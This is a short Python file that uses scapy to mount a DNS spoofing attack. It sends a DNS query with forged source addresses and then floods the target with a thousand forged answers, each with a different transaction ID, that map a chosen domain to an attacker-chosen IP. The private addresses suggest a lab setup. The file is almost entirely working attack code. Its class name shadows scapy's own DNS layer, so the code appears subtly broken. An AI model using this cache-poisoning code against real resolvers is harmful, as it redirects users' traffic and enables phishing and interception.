from src import main
from scapy.all import *
from scapy.layers.l2 import *


class DNS:
    def __init__(self, link, ip):
        self.link = link
        self.ip = ip
        # "www.google.com"         # URL to redirect

    @staticmethod
    def spoof(link, ip):
        pkts = []
        for x in range(10000, 11000):
            pkt = Ether(src="52:54:00:dd:01:50", dst="52:54:00:dd:01:49")/IP(dst="172.17.152.149",src="172.17.152.150")/UDP(dport=4250)/DNS(id=x,an=DNSRR(rrname=link, type='A', rclass='IN', ttl=350, rdata=ip))
            pkts.append(pkt)
        dns = Ether(src="52:54:00:dd:01:38", dst="52:54:00:dd:01:49")/IP(dst="172.17.152.149", src="172.17.152.138")/UDP()/DNS(qd=DNSQR(qname=link))
        sendp(dns, verbose=0)
        for pkt in pkts:
            sendp(pkt, verbose=0)
